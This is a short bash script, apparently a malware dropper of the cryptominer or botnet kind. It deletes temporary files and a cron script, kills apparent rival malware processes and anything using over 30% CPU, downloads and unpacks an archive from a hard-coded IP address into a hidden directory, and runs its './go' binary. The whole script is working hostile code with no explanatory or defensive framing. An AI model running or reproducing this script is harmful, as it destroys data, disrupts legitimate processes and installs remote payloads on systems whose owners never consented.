#!/bin/bash

rm -rf /tmp/*
rm -rf /var/tmp/*
rm -rf /etc/*hourly/gcc.sh
killall -9 trace
killall -9 kintegrityds
killall -9 kpsmouseds
cd /tmp
mkdir .scr
cd .scr
wget 45.55.211.79/.cache/jenkins/s.tar.gz
curl -O 45.55.211.79/.cache/jenkins/s.tar.gz
tar -zxvf s.tar.gz
rm -rf s.tar.gz*
cd s
kill -9 `ps xww|grep -v grep|grep "\-sh"|awk '{print $1}'`
killall -9 .bash
ps -e -o pcpu,pid,args | grep -v bash | awk '{if($1>30.0) print $2}' | while read procid
do
kill -9 $procid
done
sleep 2
./go

